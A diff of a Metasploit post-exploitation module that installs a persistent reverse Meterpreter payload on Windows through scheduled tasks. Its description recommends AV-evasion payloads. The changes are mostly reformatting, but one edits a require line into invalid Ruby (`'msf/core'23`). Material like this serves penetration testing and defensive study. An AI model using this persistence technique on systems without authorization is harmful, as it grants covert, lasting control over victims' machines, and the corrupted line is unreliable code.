@@ -3,7 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
+require 'msf/core'23
 require 'rex'
 require 'msf/core/post/common'
 require 'msf/core/post/file'
@@ -19,12 +19,7 @@ class Metasploit3 < Msf::Post
   def initialize(info={})
     super( update_info( info,
       'Name'          => 'Windows Manage Persistent Payload Installer',
-      'Description'   => %q{
-        This Module will create a boot persistent reverse Meterpreter session by
-        installing on the target host the payload as a script that will be executed
-        at user logon or system startup depending on privilege and selected startup
-        method. For best performance, set a EXE::Custom payload of either a .exe or .bat file generated with AV evasion techniques. Additionally set your own payload handler. 
-      },
+      'Description'   => %q{ This Module will create a boot persistent reverse Meterpreter session by installing on the target host the payload as a script that will be executed at user logon or system startup depending on privilege and selected startup method. For best performance, set a EXE::Custom payload of either a .exe or .bat file generated with AV evasion techniques. Additionally set your own payload handler.},
       'License'       => MSF_LICENSE,
       'Author'        =>
         [
@@ -139,7 +134,7 @@ class Metasploit3 < Msf::Post
     script_on_target = write_to_target(cusexe)
     # exit the module because we failed to write the file on the target host.
     return unless script_on_target
-    # install new scheduled tasks (removes any previously installed tasks first) 
+    # install new scheduled tasks (removes any previously installed tasks first)
     run_cmd("schtasks /delete /f /tn #{name}")
     run_cmd("schtasks /create /sc minute /mo #{delay} /tn #{name} /tr #{script_on_target}")
     print_good("Installed scheduled (" + name + ") task on " + @client.session_host)
